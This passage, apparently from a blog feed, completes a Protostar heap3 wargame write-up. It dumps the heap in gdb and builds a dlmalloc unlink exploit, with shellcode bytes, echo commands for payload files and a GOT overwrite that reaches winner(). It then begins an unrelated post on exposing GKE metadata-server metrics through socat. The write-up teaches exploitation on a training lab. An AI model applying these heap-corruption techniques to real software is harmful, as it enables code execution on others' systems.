0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000fb1  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
</code></pre>

<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
because there&rsquo;s no previous chunk that&rsquo;s free.</p>

<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 2, 0x08048750 in strcpy@plt ()
</code></pre>

<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 2, 0x08048750 in strcpy@plt ()
</code></pre>

<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
the remaining two <code>strcpy()</code>&rsquo;s.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 2, 0x08048750 in strcpy@plt ()
(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x43434343  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
<code>free()</code>. Continue again.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c008) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
second and third chunk are now tied together in a singly-linked list since they are small enough to
be considered fastbins. Continue.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 4, 0x08048790 in puts@plt ()
</code></pre>

<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>

<pre><code>(gdb) c
Continuing.
dynamite failed?

Program exited with code 021.
0x804c000:  Error while running hook_stop:
Cannot access memory at address 0x804c000
</code></pre>

<h2>Crafting the exploit</h2>

<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>

<pre><code>user@protostar:$ objdump -t /opt/protostar/bin/heap3 | grep winner
08048864 g     F .text  00000025              winner
</code></pre>

<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>

<pre><code>mov eax, 0x8048864
call eax
</code></pre>

<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
Let&rsquo;s go back to the unlink statements.</p>

<pre><code>BK = *(P + 12);
FD = *(P + 8);
*(FD + 12) = BK;
*(BK + 8) = FD;
</code></pre>

<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>

<pre><code>user@protostar:$ echo -en "AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0" &gt; /tmp/A
</code></pre>

<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>

<pre><code>user@protostar:$ echo -en "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65" &gt; /tmp/B
</code></pre>

<p>Now we craft the third and final argument. The structure for it will be some padding + some four
bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>

<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
dlmalloc into thinking the next chunk is free.</p>

<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>

<pre><code>if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
</code></pre>

<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>

<pre><code>#define inuse_bit_at_offset(p, s) \
  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)
</code></pre>

<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>

<pre><code>#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))
</code></pre>

<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>

<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
summing to a small number, at least in the way computers represent integers? In non-modular
arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
modular arithmetic, a small integer can be the sum of large numbers that are greater than the
modulus.</p>

<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
simply use <code>0xfffffffc</code> again here.</p>

<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>

<pre><code>user@protostar:/tmp$ echo -en "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08" &gt; /tmp/C
</code></pre>

<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>

<h2>Checking it works</h2>

<p>With the same gdb session as above, run the program with the three arguments.</p>

<pre><code>(gdb) r $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
0x804c000:  Error while running hook_stop:
Cannot access memory at address 0x804c000

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
</code></pre>

<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>

<pre><code>(gdb) c
Continuing.
...

Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
3583    in common/malloc.c
</code></pre>

<p>Examine the GOT entry for <code>puts()</code>.</p>

<pre><code>(gdb) x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
</code></pre>

<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000

Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
3583    in common/malloc.c
(gdb) x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c014
</code></pre>

<p>Let the rest of the program run to see <code>winner()</code> is called.</p>

<pre><code>Breakpoint 4, 0x08048790 in puts@plt ()
(gdb) si
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x0804c014 in ?? ()
(gdb) si
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x0804c019 in ?? ()
(gdb) si
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
winner () at heap3/heap3.c:8
8   heap3/heap3.c: No such file or directory.
    in heap3/heap3.c
(gdb) c
Continuing.
that wasn't too bad now, was it? @ 1587442625

Program received signal SIGSEGV, Segmentation fault.
0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x0804c01b in ?? ()
</code></pre>

<p>Now let&rsquo;s run it without gdb.</p>

<pre><code>user@protostar:~$ /opt/protostar/bin/./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
that wasn't too bad now, was it? @ 1587443061
Segmentation fault
</code></pre>

<p>Amazing.</p>

<h3>References</h3>

<ul>
<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Expose a Localhost-only Endpoint on GKE]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-expose-a-localhost-only-endpoint-on-gke/"/>
    <updated>2020-04-13T12:24:46-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-expose-a-localhost-only-endpoint-on-gke</id>
    <content type="html"><![CDATA[<p>In my <a href="/2020/04/3-levels-of-load-testing-gke-workload-identity/">previous post</a> I wrote about how to load test GKE Workload Identity. In this post I&rsquo;ll
describe how to get metrics from gke-metadata-server, the part of Workload Identity that runs on
your GKE clusters&#8217; nodes. This solution is a temporary workaround until GKE provides a better way to
get metrics on gke-metadata-server.</p>

<p>Gke-metadata-server runs as a K8s DaemonSet. It exposes metrics about itself in <a href="https://github.com/prometheus/docs/blob/master/content/docs/instrumenting/exposition_formats.md#text-based-format">Prometheus
text-based format</a>. I want to have an external scraper make HTTP requests to periodically collect
these metrics. Unfortunately, the Prometheus HTTP server only listens on the Container&rsquo;s <code>localhost</code>
interface. <strong>So how can we expose these metrics, i.e. make the HTTP endpoint available externally?</strong></p>

<h3>tl;dr lessons learned</h3>

<ul>
<li><code>socat</code> is awesome.</li>
<li>If something you need is running on a computer you control, you can always find a way extract info
from it if you&rsquo;re resourceful enough.</li>
</ul>


<!-- more -->


<h2>My specific GKE cluster configuration</h2>

<ul>
<li>GKE masters and nodes running version 1.15.9-gke.22</li>
<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
<li>6 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
<li>each node is configured to have a maximum of 32 Pods</li>
<li>cluster and node pool have WI enabled</li>
</ul>


<p>Notice the DaemonSet is configured with <code>.spec.template.spec.hostNetwork: true</code> below. This means
the HTTP server is also listening on the GKE node&rsquo;s <code>localhost</code> interface.</p>

<pre><code class="yaml">apiVersion: extensions/v1beta1
kind: DaemonSet
metadata:
  labels:
    addonmanager.kubernetes.io/mode: Reconcile
    k8s-app: gke-metadata-server
  name: gke-metadata-server
  namespace: kube-system
spec:
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      k8s-app: gke-metadata-server
  template:
    metadata:
      annotations:
        components.gke.io/component-name: gke-metadata-server
        components.gke.io/component-version: 0.2.21
        scheduler.alpha.kubernetes.io/critical-pod: '"''"'
      creationTimestamp: null
      labels:
        addonmanager.kubernetes.io/mode: Reconcile
        k8s-app: gke-metadata-server
    spec:
      containers:
      - command:
        - /gke-metadata-server
        - --logtostderr
        - --token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken
        - --identity-namespace=[REDACTED]
        - --identity-provider-id=https://container.googleapis.com/v1/projects/[REDACTED]/locations/europe-west1/clusters/[REDACTED]
        - --passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller
        - --attributes=cluster-name=[REDACTED],cluster-uid=[REDACTED],cluster-location=europe-west1
        - --enable-identity-endpoint=true
        - --cluster-uid=[REDACTED]
        image: gke.gcr.io/gke-metadata-server:20200218_1145_RC0
        imagePullPolicy: IfNotPresent
        livenessProbe:
          failureThreshold: 3
          httpGet:
            host: 127.0.0.1
            path: /healthz
            port: 54898
            scheme: HTTP
          initialDelaySeconds: 10
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 1
        name: gke-metadata-server
        resources:
          limits:
            cpu: 100m
            memory: 100Mi
          requests:
            cpu: 100m
            memory: 100Mi
        securityContext:
          privileged: true
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /var/lib/kubelet/kubeconfig
          name: kubelet-credentials
          readOnly: true
        - mountPath: /var/lib/kubelet/pki/
          name: kubelet-certs
          readOnly: true
        - mountPath: /var/run/
          name: container-runtime-interface
        - mountPath: /etc/srv/kubernetes/pki
          name: kubelet-pki
          readOnly: true
        - mountPath: /etc/ssl/certs/
          name: ca-certificates
          readOnly: true
      dnsPolicy: Default
      hostNetwork: true
      nodeSelector:
        beta.kubernetes.io/os: linux
        iam.gke.io/gke-metadata-server-enabled: "true"
      priorityClassName: system-node-critical
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: gke-metadata-server
      serviceAccountName: gke-metadata-server
      terminationGracePeriodSeconds: 30
      tolerations:
      - effect: NoExecute
        operator: Exists
      - effect: NoSchedule
        operator: Exists
      volumes:
      - hostPath:
          path: /var/lib/kubelet/pki/
          type: Directory
        name: kubelet-certs
      - hostPath:
          path: /var/lib/kubelet/kubeconfig
          type: File
        name: kubelet-credentials
      - hostPath:
          path: /var/run/
          type: Directory
        name: container-runtime-interface
      - hostPath:
          path: /etc/srv/kubernetes/pki/
          type: Directory
        name: kubelet-pki
      - hostPath:
          path: /etc/ssl/certs/
          type: Directory
        name: ca-certificates
  templateGeneration: 7
  updateStrategy:
    rollingUpdate:
      maxUnavailable: 1
    type: RollingUpdate
</code></pre>

<p>We can run a separate workload on this cluster that uses <a href="https://linux.die.net/man/1/socat"><code>socat</code></a> to proxy HTTP requests to
gke-metadata-server. <code>socat</code> stands for socket cat and is a multipurpose relay. It&rsquo;s <code>netcat</code> on
steroids and can relay any kind of packets not just TCP and UDP.</p>

<p>This proxy is deployed as a DaemonSet to make it easy to have a one-to-one
correspondence with each node-local gke-metadata-server Pod. The DaemonSet will also need to have
<code>.spec.template.spec.hostNetwork: true</code> so that it can share the same network namespace.</p>

<p>Here&rsquo;s the proxy DaemonSet YAML. I use the Docker image <a href="https://hub.docker.com/r/alpine/socat/tags"><code>alpine/socat:1.7.3.4-r0</code></a> which is a
tiny 3.61MB. The arguments <code>["TCP-LISTEN:54899,reuseaddr,fork", "TCP:127.0.0.1:54898"]</code> tell socat
to forward traffic from <code>0.0.0.0:54899</code> to <code>127.0.0.1:54898</code> which is where the Prometheus metrics
are. <code>fork</code> tells socat to</p>

<blockquote><p>After establishing a connection, handles its channel in a child process and keeps the parent
process attempting to produce more connections, either by listening or by connecting in a loop</p></blockquote>

